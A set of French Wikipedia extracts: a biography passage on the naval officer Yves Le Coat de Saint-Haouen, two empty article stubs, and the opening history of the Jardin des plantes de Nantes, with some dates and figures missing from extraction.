Après des études au lycée de Quimper, il s'engage le à l'âge de , comme volontaire dans la marine Française. Il est affecté au navire la Belle Poule (1765), où il est élève officier avant de devenir Aspirant, puis Enseigne de vaisseau. La frégate, sous le commandement de Louis Guillouet d'Orvilliers, part de Brest en avril 1771, pour une mission de surveillance de la navigation dans les Antilles. La Pérouse, Enseigne de vaisseau depuis 1764, fait partie du voyage. Le navire longe les côtes de la Martinique, puis de la Guadeloupe, avant d’arriver à Cap-Français, au nord de Saint-Domingue. Une réception pour les officiers du vaisseau y fut organisée par les familles de colons établis dans la ville. La Belle Poule est de retour à Brest en octobre 1771. Elle y est doublée de cuivre au début de l’hiver 1771, et devient ainsi le premier navire français du genre.
Le 15 février 1772, la Belle Poule repart pour l’Île-de-France, où elle emmène Charles-Henri-Louis d'Arsac de Ternay, qui vient d’être nommé gouverneur des iles de France et Bourbon. La Pérouse fait à nouveau partie des officiers présents à bord, et le jeune Saint-Haouen subit en même temps que lui le rite subit par les marins qui franchissent l’équateur pour la première fois : ils se virent tous les deux précipités dans un grand baquet d’eau de mer, après qu’un marin grimé en Neptune ait posé les questions traditionnelles au commandant.
En juillet 1772, la frégate arrive au Cap où elle se ravitaille, avant de débarquer à Port-Louis, à l'Ile de France, le 22 aout. Ternay quitte alors le navire, et le commandement passe au chevalier Grenier.
La seconde expédition du Chevalier de Grenier.
Grenier entame alors les trois voyages de sa seconde expédition dans l’océan Indien. En 1769 il avait découvert une nouvelle route vers Pondichéry, qui épargnait trois mois de navigation. Il avait également été le premier à cartographier les Seychelles. Il reprend donc en 1772 ses activités hydrographiques dans la région.
Il quitte Port Louis en octobre 1772 avec la belle poule et fait route vers le nord, passe par le deuxième banc de Nazareth, à l’ouest de l’île Gratia puis oblique vers les Seychelles ou elle arrive à Mahé. Elle se dirige ensuite vers Praslin, les sept frères, et atteint Pondichéri avant de revenir à Port-Louis.
En juillet 1773, Grenier repart, et passe cette fois à l’est du deuxième banc de Nazareth, à l’est de Gratia et de Praslin, avant d’atteindre Pondichéry puis Manille. Il est de retour le 15 avril 1774 à l'Ile de France.
En aout de la même année, il se rend à Madagascar chercher du ravitaillement obtenu par Benyowszky.
En février 1775, pour son troisième et dernier voyage, Grenier visite l'île de Corgados, passe au sud des quatrième et troisième bancs de Nazareth, au large du deuxième, accoste à l’île de Sable puis à Madagascar. Il remonte ensuite vers le nord, et arrive aux Îles Amirante par l’ouest, y mouille, avant de continuer vers Mahé, Praslin et Pondichéri.
Le 30 novembre 1776, Ternay, Grenier, Lapérouse et Saint-Haouen rentrent en France, d’abord à Lorient, d’où Ternay part pour Versailles, puis à Brest Durant son séjour dans l'océan Indien, Saint-Haouen aura commandé successivement les gabares "Victoire", "Dauphin", et "Boulonnaise".
Le combat de la belle Poule.
Le vaisseau change une nouvelle fois de commandant, et c’est Charles de Bernard de Marigny qui en devient le capitaine. Il est chargé de reconduire secrètement aux États-Unis Silas Deane, ambassadeur secret des américains à Versailles, mais est pris en chasse par deux vaisseaux anglais, qui le canonnèrent et voulurent inspecter le navire. Ils durent cependant céder et laisser repartir la frégate sans la visiter devant l’inflexibilité de Marigny. Pendant les 30 jours qui suivirent, le vaisseau lutta contre des vents contraires, qui l’obligèrent finalement à regagner Brest, sans avoir atteint l’Amérique.
Marigny changeant de vaisseau pour accomplir sa mission, partant avec son équipage de matelots sur le Sensible, c’est Jean-Isaac Chadeau de la Clocheterie qui en prend le commandement. Le 15 juin 1778, la Belle Poule quitte Brest pour une mission de surveillance. Elle rencontre alors l’escadre de l'amiral Keppel, qui la canonne, et livre son fameux combat contre l’ HMS Arethusa, le mettant en fuite après une très violente confrontation qui dura quatre heures. C’est par ce combat naval remporté par la France que débutent les hostilités entre la France et l’Angleterre de la guerre d’indépendance américaine. La Clocheterrie, endommagé, se réfugiera dans les récifs pour échapper à l’escadre anglaise.
Rentrée au port pour y subir des réparations durant l’été 1778, La Belle Poule prend à nouveau la mer du 24 septembre au 25 novembre avec Le Vengeur, navire de 64 canons, et les deux vaisseaux capturent ensemble cinq navires anglais. Saint-Haouen, avant le départ, avait changé de bord, et était passé sur le Vengeur. Ce fut un changement opportun pour lui puisqu’en 1780, la Belle Poule fut capturée par les Anglais.
La guerre aux Antilles (1778-1781).
Sous les ordres de La Motte Picquet.
Le Vengeur fait partie des cinq vaisseaux de ligne envoyés avec Toussaint-Guillaume Picquet de La Motte rejoindre l’escadre de Charles Henri d'Estaing dans les Antilles. Parti de Brest le 25 novembre 1778, il arrive en avril 1779 à Fort Royal. Il participe le 6 juillet 1779 à la bataille de la Grenade, où d’Estaing bat l’amiral anglais Byron, le Vengeur se trouvant à l’arrière garde de la flotte. Il est ensuite envoyé aider les assiégeants de Savannah en aout. Après l’échec du siège, il revient à la Martinique, endommagé.
Le 18 décembre 1779, il prend part au combat de la Martinique (1779). La Motte Picquet voyant un convoi français en difficulté dans la baie de Fort Royal, part seul sur son vaisseau les affronter pendant deux heures, avant d’être rejoint par deux de ses navires, dont le Vengeur, qui ont pu pendant ce temps-là rassembler les équipages qui avaient quartier libre à terre. Le Vengeur bataille à l’avant-garde de l’escadre de Parker, aidé par les canons de la pointe des Nègres, et du fort Saint-Louis. Les habitants de Fort Royal se massèrent en foule sur le rivage pour observer l’évolution des combats. À 19h, le combat était terminé, et la moitié du convoi avait pu être sauvée.
Au mois de janvier 1780, le Vengeur croise dans les Antilles et fait des prises. En mars, il escorte un convoi de 80 navires marchands. Le 20 de ce mois, vers Cap Français il affronte avec trois autres navires trois navires anglais sous les ordres de Cornwallis.
Les trois combats de M. de Guichen.
Rentré à Fort Royal, il passe sous les ordres de Luc Urbain du Bouëxic de Guichen. Le 17 avril, il est à la bataille de la Martinique, à l’avant-garde de la flotte. Durant les combats, il attaqua le , navire de l’amiral anglais Rodney. Il est également présent à la canonnade du 15 mai suivant contre la flotte anglaise, ainsi qu’au combat du 20 mai, durant lequel meurt le fils de Guichen. Le vengeur part ensuite pour La Havane rejoindre une escadre espagnole, mais une épidémie se déclare dans la flotte, tuant le fils de Louis Guillouet d'Orvilliers. Le 3 janvier 1781, le Vengeur est de retour à Brest.
Avec Suffren dans les mers de l’Inde. (1781-1784).
Saint-Haouen, enseigne de vaisseau, est affecté à la petite escadre de 5 navires dont le Bailli de Suffren prend le commandement. Le Vengeur est alors commandé par le capitaine de Forbin. Le 22 mars, il quitte Brest avec l’escadre du comte de Grasse, et s’en sépare le 29 pour faire route vers le sud. Le 16 avril, Suffren trouve une escadre anglaise au mouillage à Porto Praya, au Cap-Vert. Profitant de la surprise des Anglais, il attaqua seul, mollement soutenu par le reste de l’escadre. Le Vengeur, qui avait mis du temps à se décider à agir, traversa l’escadre anglaise, tirant de loin, et dériva ensuite loin de combats.
Le 20 juin, l’escadre arriva au Cap, ou elle put se ravitailler. Elle y arriva juste à temps pour protéger la ville d’une escadre britannique décidée à s’en emparer, mais qui voyant la flotte française, décida de passer au large. Fait élève ingénieur constructeur en 1780, Saint-Haouen y prend part aux réparations de L'Annibal, gravement endommagé.
Le 26 aout, l’escadre française repart, et arrive le 25 octobre à Port Louis. Ils en repartent le 7 décembre, se dirigeant vers Pondichéri, et passant par la route découverte en 1769 par le chevalier Grenier. À la Bataille de Sadras, le 17 février, Suffren cherche à envelopper l’arrière-garde anglaise. Mais Forbin, capitaine du Vengeur, refuse de le suivre, et laisse ainsi aux anglais la possibilité de s’échapper.
Arrivés à Pondichéri, puis à Porto Novo, l’escadre en repart le 24 mars 1782 pour aller attaquer Trinquemalay. Mais les Anglais réagissent, et les deux flottes s’affrontent à nouveau à Provédien. Le 30 avril, Suffren relâche à Batticaloa. Le 3 juin, le Vengeur part chercher des biscuits à Pondichéri. Le 6 juillet, le Vengeur et le reste de l’escadre combattent les Anglais à Négapatam, mais l’adversaire s’échappe encore. La flotte hiverne à Aceh, de novembre à décembre 1782.
Après la prise de la ville, la flotte anglaise se confronte à nouveau à l’escadre française, à Trinquemalay. C’est à cette période que Saint-Haouen quitte le Vengeur et s’embarque sur La Consolante. Ces deux vaisseaux sont employés durant la bataille à doubler l’arrière garde anglaise, mais la manœuvre échoue, et le vengeur perd son mat.
Le 20 juin 1783, la Consolante est à la Bataille de Gondelour, et le 29 juin, la paix est annoncée. Le 6 octobre Suffren appareille pour la France, emmenant l’équipage d’origine provençale avec lui à Toulon, et laissant les bretons, dont Saint-Haouen rentrer à Brest, ou il arrive en avril 1784.
Séjour à paris et reconversion (1784-1790).
La paix revenue, Saint-Haouen, devenu élève ingénieur constructeur, passe deux ans au port de Brest, comme l’exige sa formation. Il est ensuite sélectionné parmi les autres élèves pour être formé à Paris. Il intègre donc en 1786 la Grande école de Construction de Paris. Il échoue cependant deux fois à son examen de sortie, et doit revenir à Brest en 1788, où il travaille à la capitainerie du port, et où son grade d’enseigne de vaisseau est converti en celui de sous-lieutenant de port.
Les guerres de la Révolution et de l'Empire.
Guerre dans les Antilles.
À bord de l'Éole, à la fin de 1790 il s'embarque pour la Martinique puis pour Saint-Domingue, ou, Lieutenant de vaisseau le , il dirigeait le service des convois à bord de , du 17 juillet à décembre. Il reçut trois blessures en repoussant une attaque des révoltés contre un camp qu'il avait établi. Malade, il fut rapatrié en France à bord du vaisseau marchand La Parfaite Régénération, le 30 janvier 1793 après avoir bu l'eau d'une rivière empoisonnée par les mutins.
Emprisonnement.
Il est brièvement emprisonné à la prison des Carmes vers frimaire 1793, puis à la prison de l'Abbaye comme Royaliste, à cause de ses liens avec les milieux monarchistes, dont Villaret de Joyeuse, et à cause de son patronyme peu républicain, à partir du 22 juillet 1794, et jusqu'à la chute de Robespierre, le 9 Thermidor. Étant mis au courant du coup de main contre le Comte d'Artois sur l'île d'Yeu avant sa réalisation, il parut suspect après son échec. Le cependant, grâce à l'intervention des députés du Finistère à la convention, il est rétabli dans ses fonctions d'officier de Marine, et est promu Capitaine de vaisseau le 11. Il est ensuite chef militaire de Nantes et de Paimboeuf ou en avril 1795, il s'occupe notamment de la surveillance et de la défense de la Loire en pleine guerre de Vendée. Il obtiendra même le versement de sa solde pour la durée de son exclusion de la marine.
Chef d'état-major de Latouche-Tréville et de Bruix.
La même année il secours Belle-Île-en-Mer pendant l'été en la ravitaillant, alors que celle-ci s'apprêtait à tomber aux mains de l'Amiral Ellisson qui la bloquait, puis est fait Chef d'escadre le 22 septembre 1796, et deviendra après la suppression générale de ce grade capitaine de vaisseau de première classe, l'équivalent du grade Anglais de Commodore. Il est chef militaire à Ancône en 1799, commandant sur la &lt;ref name="FB 1200010207/349"&gt;.&lt;/ref&gt; et chef d'état-major de l'Amiral Latouche-Tréville vers 1800, d'abord à Toulon, puis à Boulogne. Il participe à la Croisière de Bruix, qui tente du au de restaurer la puissance Française en Méditerranée, en commandant Le Terrible (1779), vaisseau de . À cette occasion, il est chargé d'aller secourir Corfou assiégé par les Anglais, et il fait le serment de , mais la nouvelle de la capitulation de l'île lui parvenant, il n'alla pas plus loin que Gênes.
Il rend en cette période plusieurs mémoires pour établir les points de la côte Atlantique au sud de Brest ou il est nécessaire d'établir des postes de frégate canonnière.
C'est vraisemblablement durant cette période passée en Méditerranée qu'il fait la rencontre du corsaire Giuseppe Bavastro qui lui dicte ses mémoires, mémoires. Elles seront reprises par Henri Lauvergne dans sa biographie de 1853 "Bavastro, ou un corsaire sous l'Empire".
Après s'être fait remarquer par ses premiers travaux télégraphiques, il est nommé en 1801 chef d'état major de Bruix qui commande la première flottille de la Manche, qu'il protège à plusieurs reprises de l'Amiral Nelson, notamment durant son Attaque du 14, 15 et 16 août 1801. À cette occasion, avec son supérieur l'amiral Latouche-Tréville, il s'occupe de protéger la flottille française de tout effet de surprise en alignant des petits vaisseaux jusqu'aux lignes Anglaises afin d'être alerté par des signaux lumineux en cas d'attaque. Plus tard, il protègera la flottille face à l'amiral Jackson : c'est lui qui exécute la périlleuse manœuvre de rassemblement des flottilles de Dunkerque et Calais jusqu'au port de Boulogne, forçant les Anglais à la retraite malgré leurs forces supérieures lors de l'affrontement du 27 au 29 septembre 1803, ce qui lui vaut cette lettre de Denis Decrès, en date du 6 octobre 1803 :
Il avait accompagné le premier consul lors de sa visite du juillet 1803 à Calais. En août de l'année suivante, il est nommé commandant de la rade et du port de Calais pour répondre aux attaques anglaises, qui bombardaient le littoral et débarquaient des espions.
Combat du 27 au 29 septembre 1803 autour du cap Gris-Nez.
Le combat du 27 au 29 septembre 1803 est une bataille navale qui s'est déroulée autour du cap Gris-Nez entre Boulogne et Calais, opposant la croisière anglaise de la Manche de l'amiral Jackson, à la flotte française de Yves Le Coat de Saint-Haouen alors que ce dernier tentait de rassembler à Boulogne les flottilles constituées dans les ports de Calais et de Dunkerque. L'affrontement se solda par une victoire française.
Le 27, dans les derniers jours de septembre 1803, une partie de l'escadre de Dunkerque partit pour gagner Boulogne sous le commandement de Le Coat de Saint-Haouen , alors chef d'escadre et chef d'état major du Camp de Boulogne. Arrivé au point de Calais, voyant l'escadre anglaise se dérober après avoir échangé à bord de son vaisseau, la prame "Ville de Lille", quelques coups de canon avec une corvette anglaise, "Léda", il craignit qu'elle ne revint supérieure en nombre et, le vent étant de plus tombé, l'empêchant de doubler Gris-Nez, il relâcha dans le port de Calais sans doubler le cap. L'amiral Bruix, apprenant la nouvelle, fit dépêcher de Dunkerque une division pour secourir celle du port de Calais, que les Anglais étaient revenus bombarder avec 20 bâtiments dont 4 bombardes-canonnières le 27 septembre pendant 4 heures. N'ayant causé que peu de dégâts et qu'une seule victime, un citoyen britannique emprisonné dans la ville, et essuyant le feu des batteries terrestres françaises, les batteries des dunes, celles du fort Rouge et du fort Risbanc, qui forçaient certains navires à quitter la ligne, la croisière anglaise se retira.
Le lendemain au matin à 9 heures, le 28 septembre, l'escadre de Saint-Haouen, composée de 28 bateaux-canonniers, appuyée par celle de Dunkerque et celle de Boulogne, dépêchées en renfort, et par les batteries françaises sur les plages, fonça vers le cap Gris-Nez, avant d'être rattrapée par les Anglais en face de Sangatte, qui ouvrirent un feu nourri sur les navires français. Saint-Haouen, faisant notamment usage de la rame, réussit néanmoins à passer et mouilla dans le port de Boulogne l'après-midi même à 15 heures 15.
Cependant, la division venue de Dunkerque, commandée par le capitaine Pevrieux, était en difficulté, n'ayant pas réussi à doubler le cap Gris-Nez. Saint-Haouen et le contre-amiral Magon de Médine sortirent le 29 septembre pour lui venir en aide, la rejoignirent devant Wimereux, à l'endroit du fort de Croy, puis se dirigèrent vers l'escadre anglaise composée de 20 vaisseaux de trois-mâts, pour l'affronter durant deux heures, la forçant ainsi à se retirer.
Cette victoire navale française permit d'achever le rassemblement des flottilles vers celle de Boulogne de septembre à décembre, dans l'optique d'un débarquement en Angleterre, regroupant ainsi plus de mille bâtiments.
Chef militaire du camp de Boulogne.
Le 8 juillet 1803, il est fait chef militaire du camp de Boulogne. Dans la nuit du premier octobre 1804, lorsque les Anglais tentent d'incendier la flottille de Boulogne, il forme sous le feu ennemi une estacade qui arrête les brûlots et fut blessé à cette occasion. Après cette attaque, il est chargé d'établir une chaine de barrage au-delà de la ligne d'embossage. La même année, il protégea à nouveau la flottille, d'abord à Calais puis à Boulogne contre les tentatives Anglaises.
À Boulogne, il est alors chargé de la partie maritime du débarquement en Angleterre et il est l'auteur du plan visant à faire passer la Manche à la flottille de Boulogne jusqu'en Angleterre. Il choisit pour traverser la manche de reprendre la méthode basée sur la ligne d'embossage, formant une première ligne protégeant le reste de la flottille. Il juge alors possible d'embarquer et sortir du port en deux marées seulement.
Il est l'auteur en 1806 des "Détails du Projet de construction d'un port militaire, d'un port de commerce et d'une rade, entre Calais et Sangatte".
Le , il conduit le canot dans lequel Napoléon visitait la flottille et les ports de Wimereux et d'Ambleteuse, accompagné de Louis-Alexandre Berthier et du ministre de la Marine Denis Decrès, tandis que la flotte maintenait à distance par une canonnade l'escadre Anglaise. Il confia ensuite à Caulaincourt avoir été assez inquiet lors de cette sortie en mer, tandis que Napoléon lui, avait l'air diverti par le coups de canons échangés.
Plusieurs fois blessé, il est fait chevalier puis Officier de la Légion d'Honneur les 5 février et , Préfet maritime du premier arrondissement à Boulogne le jusqu'au , puis de Dunkerque.
Sous la Restauration.
Rencontre avec Louis XVIII.
Il obtient la même année du Ministre de la marine du gouvernement provisoire Pierre-Victor Malouet, d'aller rendre les hommages de la marine française à Louis XVIII à Hartwell, qui le fera Baron le 18 mai 1814, chevalier de Saint-Louis et contre-amiral le 8 juillet 1816. Le souverain s'entretint notamment avec lui de l'état du port de Brest. Il recevra le Roi, accompagné de Marie-Thérèse de France, et du Prince de Condé chez lui la même année lors de son séjours à Boulogne du 24 au 26 avril dans son hôtel de la préfecture maritime. Le roi lui dira en quittant sa maison : 
Il accompagnera le roi jusqu'à Paris. Sa rencontre avec le roi lui servira plus tard pour faire approuver le télégraphe de son invention par l'état, en sollicitant le souverain lui-même. Elle lui permettra également de faire rentrer son fils aîné, Antoine, dans la garde royale en tant qu'officier.
Revenu à Boulogne, il vend les débris de la flottille et consacre le produit de la vente à la construction d'une plateforme en haut de l'ex-colonne de la Grande Armée, qui deviendra par la suite colonne Bourbon, afin d'en faire un phare. Il s'appliquera par la suite à achever la colonne, veillant par exemple à la pouvoir d'un escalier.
Durant les Cent-Jours, il est révoqué de ses fonctions et il se retire dans la campagne normande.
Major-Général de la Marine.
Major général de la Marine du port de Brest à la seconde restauration le 21 juin 1815, il préside la première commission d'enquête au sujet du naufrage de la Méduse en recueillant le témoignage des marins survivants. Professant en public ses opinions royalistes, il fait donner une fête particulière le 26 avril 1816 dans ses quartiers du pavillon sud du fort de Brest, afin de célébrer le second anniversaire de la venue du roi chez lui. À cette occasion, il recevra les plus hautes personnalités de la ville et de la flotte de Brest dont Charles de Bernard de Marigny, François Nivard Charles Joseph d'Hénin, Gabriel Mathieu Simond de Moydier, le maire de la ville Le Gros, François Joseph Bouvet, ou encore Pierre Devaux. Il fit don ce jour-là d'un buste de Louis-XVIII à la ville de Brest, s'engagea à offrir chaque année à la même date un vêtement complet à la famille de marin la plus nécessiteuse de Brest, et 21 coups de canons furent tirés à la fin du banquet, durant lequel on porta à plusieurs reprises la santé du roi et de la famille royale.
Cet épisode lui valut les foudres d'Alphonse Aulard, l'historien de la révolution, qui y vit la manifestation de la plus grande ingratitude envers la révolution, dans le chapitre "Un épisode de la restauration à Brest" tiré de l'ouvrage "La Révolution Française", paru en 1902.
Il est mis à la retraite le lors de la réduction générale des cadres de la marine, il meurt en poursuivant ses travaux télégraphiques en 1826 à Calais.
Travaux sur le télégraphe et sur les phares.
Son système télégraphique, le Télégraphe Saint-Haouen fut expérimenté sur ordre du ministre de la marine de mai à juin 1820. Par un décret en conseil des ministres il fut décidé la construction d'une ligne entre Paris et Bordeaux et les premiers travaux avaient commencés lorsque le projet fut interrompu par une campagne de Calomnie initiée par Chappe. Il fut utilisé par Louis de France (1775-1844), duc d'Angoulême durant sa campagne d'Espagne en 1823 ainsi que par l'amiral Duperré pendant l'invasion de l'Algérie en 1830. Face à son échec en France, Saint-Haouen décida de livrer son invention au commerce, mais tomba rapidement à court d'argent en montant une société, et fut privé de liberté momentanément à cause de cela; Appelé en Angleterre par Huskisson qui voulait porter à la connaissance de l'amirauté britannique son télégraphe, il s'apprêtait également à présenter son système en à une société capitaliste en Grande-Bretagne, lorsqu'il mourut en 1826. Ironie de l'histoire, le télégraphe de son concurrent sera installé sur le toit de sa propre résidence à Brest, l'hôtel Halligon, au 1 place des Portes, après une bataille judiciaire acharnée.
Il imagine en 1811 d'unifier le système de signalisation des phares côtiers en utilisant des verres de couleur afin de rendre toute la côte Française lisible par les marins. Avançant pour motif le nombre élevé de naufrages et de vies humaines perdues, il propose d'éclairer les côtes avec des « tours à feux » aux lumières bleues et rouges. Chaque tour faisant une composition unique des deux lumières, rouge à gauche et bleu à droite au Cap Gris-Nez par exemple, aiderait à la signalisation d'un point précis du littoral par les navires. De ses travaux naît directement la Commission des phares, chargée d'examiner son projet.
Famille.
Seules les filles auront une descendance, le titre passant au frère cadet de Saint-Haouen à sa mort, Antoine.
Apparition littéraire.
Saint-Haouen apparaît dans "Captain Justice" d'Anthony Forrest, ou, chef du port de Boulogne, il interroge le héros après son arrivée en France.
Il intervient aussi dans la nouvelle de 1871 "A Sea Story" du Lieutenant C. R. Low, dans laquelle il incarne le capitaine du vaisseau qui transporte le général Moreau vers l’Angleterre.

</doc>
<doc id="9626431" url="https://fr.wikipedia.org/wiki?curid=9626431" title="Mégascience">
Mégascience



</doc>
<doc id="9626438" url="https://fr.wikipedia.org/wiki?curid=9626438" title="Guillaume Levasseur de Bonplan">
Guillaume Levasseur de Bonplan



</doc>

<doc id="2843803" url="https://fr.wikipedia.org/wiki?curid=2843803" title="Jardin des plantes de Nantes">
Jardin des plantes de Nantes

Le jardin des plantes de Nantes, ou le Jardin des plantes, est un jardin botanique appartenant à la ville de Nantes. Ouvert au public, il couvre une superficie de .
Avec les jardins de Kermoureau à Herbignac, il est l'un des seuls espaces verts du département de la Loire-Atlantique à être classé "Jardin remarquable".
Situation.
Le jardin des plantes se situe dans le quartier Malakoff - Saint-Donatien, au nord de la gare SNCF.
Il couvre une superficie de et a globalement la forme d'un rectangle orienté nord-sud, longé par :
Il possède cinq entrées : 
Histoire.
Les prémices du Jardin des plantes : le jardin des Apothicaires.
C'est en 1687 que fut créé le premier jardin botanique de la ville de Nantes. Les maîtres apothicaires se voient confier la jouissance d'un terrain situé à l'ouest de la ville. Ce jardin des apothicaires se situe alors dans le quartier du Marchix (où sera construite la Tour Bretagne au ). L'accès se fait par la rue Paré qui existe encore au début du , la parcelle, totalement urbanisée par la suite, est traversée par la rue de Budapest. Ce jardin est uniquement destiné à la culture des végétaux. Ainsi, au , la ville ne comporte pas de jardins particulièrement signifiants destinés à la promenade.
Ce jardin se développe sous l'action de Pierre Chirac, l'intendant du Jardin du Roi, situé à Paris. Ce dernier comprend vite le rôle que peut jouer un jardin botanique qui se situe dans un port alimenté par un fort trafic de produits exotiques et qui, grâce à la Loire, permet un accès aisé vers Paris. Chirac y voit un lieu idéal pour favoriser l'acclimatation des plantes tropicales rapportées par les navigateurs de leurs lointaines escapades. En 1719, son action permet au jardin des apothicaires de devenir un « jardin royal des plantes », subordonné au Jardin du Roi. Le développement de ce jardin se trouve considérablement encouragé par l'ordonnance royale prise le par Louis XV pour « assujettir les Capitaines des Navires de Nantes d'apporter Graines &amp; Plantes des Colonies des Païs Etrangers, pour le Jardin des Plantes Médicinales établi à Nantes ».
Le succès de cette mesure est tel que le Jardin des apothicaires s'avère vite trop petit pour accueillir toutes les plantes. Cependant, la Révolution française survient sans qu'un autre emplacement ait été trouvé.
1793-1836 : la mise en place d'un Jardin des plantes à l'est de Nantes.
Le , la Convention nationale prend un décret qui marque la réorganisation des jardins botaniques en France. Il y est notamment décidé la création dans chaque département d'un jardin botanique de quatre arpents.
François Lemeignen (1732-1803), un médecin originaire de Machecoul, se bat alors pour qu'un tel jardin soit créé à Nantes. Il propose de l'implanter dans le couvent des Ursulines fondé en 1626. Celui se trouve à l'est de la ville entre le « faubourg Saint-Clément et celui de Richebourg, à peu de distance du cours Saint-Pierre ». Cette proposition est retenue et Lemeignen est chargé d'en assurer l'entretien. Le terrain mesure , et est situé à l'emplacement où va être installée à partir de 1806 la cour de récréation du lycée de Nantes.
La création du lycée de Nantes dans l'ancien couvent des Ursulines par un arrêté du Premier Consul le Vendémiaire an XII () conduit le Jardin des plantes à rechercher un nouvel emplacement.
Le , le préfet Belleville prend un arrêté définissant les limites du jardin botanique qui s'implante alors définitivement sur un terrain attenant à l'ancien couvent des Ursulines. Le tracé du jardin est confié à l'architecte-voyer nantais Félix-François Ogée. L'apothicaire et botaniste Jean Alexandre Hectot (1769-1843), un ancien élève de Lemeignen, est nommé directeur de ce nouveau jardin des plantes qui a désormais trouvé son emplacement définitif.
La mise en place de ce jardin botanique est cependant problématique. Faute de moyens financiers, le jardin tombe peu à peu en décrépitude, malgré les incessants efforts d'Hectot. On lui doit notamment d'avoir planté en 1809 un superbe Magnolia grandiflora connu à l'époque pour être l'un des plus beaux du pays. Un autre magnolia planté au même endroit est aujourd'hui le plus ancien du jardin (voir en Description).
Épuisé par les efforts qu'il a dû mener pour préserver le jardin malgré les difficultés financières, Hectot quitte la direction du Jardin des plantes en 1819. Le jardin est alors dans un état déplorable, notamment en raison de l'absence de surveillance de la part d'employés plus préoccupés de cultiver des parcelles qui leur avaient été cédées pour leur usage personnel.
Par ordonnance royale du , Louis XVIII décide de transférer la propriété du jardin du Département à la ville de Nantes. Celle-ci a alors comme objectif d'ouvrir le jardin au public et, devant les difficultés d'assurer les travaux nécessaires par ses propres services, elle décide d'en confier le réaménagement à un professionnel. C'est au printemps 1822 que Louis Lévêque, maire, prend les premiers contacts avec Antoine Noisette (1778-1858), un paysagiste parisien réputé, frère du botaniste et agronome Louis Claude Noisette. En , il accepte de prendre la direction des travaux. En plus d'un salaire confortable et d'un logement de fonction, Noisette dispose d'un avantage considérable : la possibilité de vendre à son profit les plantes en surnombre. Au cours des années, ce qui était une activité annexe prend de plus en plus d'importance au risque de voir le jardin botanique appauvri de ses espèces les plus intéressantes au profit de plantations plus rentables. En effet, la partie nord de l'enclos est consacrée à l'activité botanique alors que la partie sud est affermée.
Le jardin est finalement ouvert en 1829 au public, tout au moins sa partie haute. Il est cependant fermé le dimanche et jours de fêtes, ce qui ne manque pas de soulever des protestations de la part des nantais. La possibilité confiée à Noisette de mener des activités commerciales au sein du jardin semble avoir été la principale raison de la dégradation des relations entre le directeur du Jardin et la municipalité. En 1833, une commission est nommée pour régler les conflits entre les deux parties et, malgré quelques solutions provisoires, la ville décide finalement de ne pas reconduire Noisette dans ses fonctions de directeur. L'administration du Jardin des plantes est complètement revue à la suite du rapport rendu au maire Ferdinand Favre par une commission de surveillance en juin 1835. C'est finalement en septembre 1835 qu'Antoine Noisette quitte la direction du jardin, non sans avoir obtenu que son fils Dominique soit nommé jardinier en chef.
C'est cependant le titulaire de la nouvelle chaire de botanique qui vient marquer de son empreinte l'histoire du Jardin des plantes.
1836-1882 : l'influence déterminante d'Écorchard.
Jean-Marie Écorchard (1809-1882) est nommé le pour assurer la chaire de botanique créée par le conseil municipal le . Ce n'est alors qu'un jeune médecin de 26 ans qui a suivi des cours de botanique à l'université de Rennes et a herborisé avec Augustin Pyrame de Candolle. Lorsqu'il entre en fonction, il est effaré par l'état d'un jardin qui est alors, selon lui, . Critique envers le bilan d'Antoine Noisette, Écorchard a aussi rapidement des relations tendues avec le fils Dominique, le jardinier en chef. Dans un courrier adressé en 1838, il se plaint ainsi des nombreuses négligences de ce dernier dans l'approvisionnement en plantes nouvelles et de sacrifier l'intérêt général à son intérêt particulier. En 1839, le contrat de Dominique Noisette n'est pas renouvelé et celui-ci quitte alors Nantes. Écorchard se retrouve directeur du Jardin le .
Sous la direction d'Écorchard, les travaux d'aménagement reprennent et, surtout, les collections végétales s'enrichissent considérablement. Le nouveau directeur s'approvisionne tant auprès des pépiniéristes locaux, dont son prédécesseur Antoine Noisette, que grâce aux apports des navigateurs férus de botanique qui perpétuent la tradition d'apport de plantes exotiques du siècle précédent. Parmi ceux-ci, Mathurin Jean Armange (1801 - 1877) se distingue particulièrement par la régularité et la richesse de ses apports. Ce capitaine de marine marchande passionné de botanique et d'horticulture navigue principalement vers la Martinique, La Réunion et les Indes. De 1841 à 1863, il rapporte à Nantes des milliers de graines et de plantes vivace qui alimentent le Jardin des plantes mais aussi la Société nantaise d'horticulture et le Muséum national d'histoire naturelle de Paris. Écorchard se bat pour obtenir les crédits nécessaires à la construction d'une serre chaude indispensable à la conservation de ces plantes exotiques. Elle est finalement construite en 1844 mais satisfait tout juste aux besoins.
Écorchard est fortement impressionné par les exemples des jardins botaniques rencontrés lors de ses voyages, notamment par les Jardins botaniques royaux de Kew près de Londres et le Jardin botanique national de Belgique de Meise. En 1844, il propose de transformer le Jardins des plantes en jardin à l'anglaise en argumentant qu'. Il s'oppose ainsi aux conceptions d'Henri-Théodore Driollet, l'architecte en chef de la Ville. Fort du soutien d'Adolphe Brongniart, alors directeur du jardin des plantes de Paris, et de Dominique Noisette, devenu paysagiste de renom, il entreprend de transformer le plan du jardin, parfois au mépris des ordres des maires qui se succèdent. Ainsi, il entreprend en 1846 la création de la « montagne », un monticule dont la construction prendra plusieurs années. La partie médiane du jardin sera finalement ouverte au public en .
C'est à l'occasion de l'arrivée du chemin de fer à Nantes que le jardin va acquérir sa forme définitive. En effet, le quartier de Richebourg est réorganisé avec l'inauguration de la gare en 1853 et le percement de l'actuel boulevard de Stalingrad. Un décret impérial du entérine l'extension vers le sud du jardin sur une superficie de , mais ce n'est qu'en 1858 que les terrains seront tous acquis en raison de la complexité du découpage parcellaire et de nombreux recours des riverains ; cette zone englobe la partie centrale de la rue de Richebourg, qui garde son appellation, bien que coupée en deux, jusqu'en 1874 ; cette année-là, la partie est de la rue est baptisée rue d'Allonville.
En parallèle, Écorchard poursuit les travaux d'embellissement du jardin, en dotant notamment en 1856 le versant ouest de la montagne d'une cascade alimentée par une ingénieuse fontaine qui est toujours en fonctionnement. Mais les escarmouches entre le directeur du jardin et les services municipaux se poursuivent. Ainsi en 1858, il s'oppose à nouveau à Driollet qui souhaitait un aménagement du jardin à la française. Après consultation d'experts, dont Jean-Pierre Barillet-Deschamps, le jardinier en chef du Bois de Boulogne, la Ville donne raison à Écorchard et le conseil municipal adopte définitivement son projet le . L'année 1859 est marquée par la réalisation des derniers travaux : les porteries, le creusement du grand bassin, les clôtures… La partie haute du jardin est officiellement inaugurée le devant visiteurs. L'ensemble du jardin est ouvert au public le .
